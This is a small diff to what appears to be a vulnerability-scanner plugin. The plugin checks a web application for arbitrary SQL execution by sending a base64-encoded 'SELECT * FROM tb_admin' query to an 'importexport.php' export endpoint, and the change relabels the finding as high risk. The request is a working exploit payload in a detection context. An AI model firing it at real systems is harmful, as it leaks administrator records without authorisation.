@@ -29,7 +29,7 @@ class P(T):
         payload = arg + 'importexport.php?sql=U0VMRUNUICogRlJPTSB0Yl9hZG1pbg%3D%3D&tab=tb_admin&type=exportexcelbysql'
         code, head, res, err, _ = curl.curl2(payload)
         if code == 200 and '[admin]' in res:
-            output('SQL execution: '+payload,result,'hole')
+            output('SQL execution: '+payload,result,'高危(HOLE)')
         
         del curl
         return result
